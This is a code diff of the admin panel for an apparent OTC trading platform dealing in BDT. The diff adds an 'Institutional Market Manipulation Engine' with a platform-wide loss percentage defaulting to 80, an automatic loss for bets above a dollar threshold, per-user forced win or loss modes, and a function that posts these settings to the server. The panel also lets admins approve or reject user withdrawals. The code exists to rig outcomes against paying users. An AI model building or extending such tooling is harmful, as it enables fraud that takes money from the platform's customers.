@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PRO-TRADE Master Admin</title>
+  <title>PRO-TRADE Master Admin Control</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
     body { background: #0b0e14; color: white; padding: 20px; }
@@ -12,7 +12,7 @@
     .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; margin-bottom: 20px; }
     .stat { background: #0b0e14; padding: 12px; border-radius: 8px; text-align: center; }
     .val { font-size: 18px; font-weight: bold; color: #00e676; margin-top: 5px; }
-    select, button { padding: 10px; border-radius: 6px; border: 1px solid #222b3d; background: #0b0e14; color: white; outline: none; }
+    input, select, button { padding: 10px; border-radius: 6px; border: 1px solid #222b3d; background: #0b0e14; color: white; outline: none; }
     .btn-approve { background: #00c853; font-weight: bold; cursor: pointer; border: none; padding: 6px 12px; border-radius: 4px; }
     .btn-reject { background: #ff1744; font-weight: bold; cursor: pointer; border: none; padding: 6px 12px; border-radius: 4px; }
     .queue-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #0b0e14; margin-bottom: 8px; border-radius: 6px; font-size: 13px; }
@@ -23,7 +23,7 @@
   <div id="login-box" class="card" style="max-width: 380px; margin: 80px auto;">
     <h2>Admin Master Access</h2>
     <input type="password" id="pin" placeholder="Enter Security PIN" style="width: 100%; padding: 12px; margin-bottom: 15px; background: #0b0e14; border: 1px solid #222b3d; color: white; border-radius: 6px;">
-    <button onclick="login()" style="width: 100%; background: #00e676; color: black; font-weight: bold; cursor: pointer; border: none;">Login Dashboard</button>
+    <button onclick="login()" style="width: 100%; background: #00e676; color: black; font-weight: bold; cursor: pointer; border: none;">Login Master Panel</button>
   </div>
 
   <div id="dashboard" style="display: none;">
@@ -38,19 +38,31 @@
     </div>
 
     <div class="card">
-      <h2>OTC Trade Manipulation Control</h2>
-      <div style="display: flex; gap: 10px; align-items: center;">
-        <span style="font-size: 14px;">Target User Mode:</span>
-        <select id="user-mode" onchange="setMode()">
-          <option value="AUTO">AUTO (Natural System)</option>
-          <option value="FORCE_WIN">FORCE WIN (User Always Wins)</option>
-          <option value="FORCE_LOSS">FORCE LOSS (User Always Loses)</option>
-        </select>
+      <h2>Institutional Market Manipulation Engine</h2>
+      <div style="display: flex; flex-direction: column; gap: 12px;">
+        <div style="display: flex; gap: 10px; align-items: center;">
+          <span style="font-size: 14px; width: 180px;">Global Platform Loss %:</span>
+          <input type="number" id="house-edge-val" value="80" style="width: 80px;"> %
+          <button onclick="updateConfig()" style="background:#00e676; color:black; font-weight:bold; cursor:pointer;">Update</button>
+        </div>
+        <div style="display: flex; gap: 10px; align-items: center;">
+          <span style="font-size: 14px; width: 180px;">Big Bet Auto-Loss ($):</span>
+          <input type="number" id="big-bet-val" value="50" style="width: 80px;"> $
+          <button onclick="updateConfig()" style="background:#00e676; color:black; font-weight:bold; cursor:pointer;">Update</button>
+        </div>
+        <div style="display: flex; gap: 10px; align-items: center; margin-top: 10px;">
+          <span style="font-size: 14px; width: 180px;">Individual User Mode:</span>
+          <select id="user-mode" onchange="setMode()">
+            <option value="AUTO">AUTO (Natural System Algorithm)</option>
+            <option value="FORCE_WIN">FORCE WIN (User Always Wins)</option>
+            <option value="FORCE_LOSS">FORCE LOSS (User Always Loses)</option>
+          </select>
+        </div>
       </div>
     </div>
 
     <div class="card">
-      <h2>Pending Deposits & Withdrawals Queue</h2>
+      <h2>Pending Deposit & Withdrawal Queue</h2>
       <div id="queue-list"></div>
     </div>
   </div>
@@ -78,11 +90,13 @@
           document.getElementById('d-1h-with').innerText = '$' + data.stats.with1h;
           document.getElementById('d-24h-dep').innerText = '$' + data.stats.dep24h;
           document.getElementById('d-24h-profit').innerText = '$' + data.stats.profit24h;
+          document.getElementById('house-edge-val').value = data.stats.houseEdge;
+          document.getElementById('big-bet-val').value = data.stats.bigBetThreshold;
 
           let html = '';
           data.pendingDeposits.forEach(d => {
             html += `<div class="queue-row">
-              <span>DEP: $${d.amount} (≈${d.bdtAmount} BDT) - TRX: ${d.trxId}</span>
+              <span>DEP: $${d.amount} (≈${d.bdtAmount} BDT) - TRX: ${d.trxId} [${d.method}]</span>
               <div>
                 <button class="btn-approve" onclick="action('${d.id}', 'DEPOSIT', 'APPROVE')">Approve</button>
                 <button class="btn-reject" onclick="action('${d.id}', 'DEPOSIT', 'REJECT')">Reject</button>
@@ -92,7 +106,7 @@
 
           data.pendingWithdrawals.forEach(w => {
             html += `<div class="queue-row">
-              <span>WITH: $${w.amount} (≈${w.bdtAmount} BDT) - ACC: ${w.accountNo}</span>
+              <span>WITH: $${w.amount} (≈${w.bdtAmount} BDT) - ACC: ${w.accountNo} [${w.method}]</span>
               <div>
                 <button class="btn-approve" onclick="action('${w.id}', 'WITHDRAWAL', 'APPROVE')">Approve</button>
                 <button class="btn-reject" onclick="action('${w.id}', 'WITHDRAWAL', 'REJECT')">Reject</button>
@@ -102,6 +116,16 @@
 
           document.getElementById('queue-list').innerHTML = html || 'No pending financial requests';
         });
+    }
+
+    function updateConfig() {
+      const houseEdge = document.getElementById('house-edge-val').value;
+      const bigBetThreshold = document.getElementById('big-bet-val').value;
+
+      fetch('/api/admin/config', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ houseEdge, bigBetThreshold })
+      }).then(() => alert("Configuration Updated Successfully!"));
     }
 
     function action(id, type, act) {
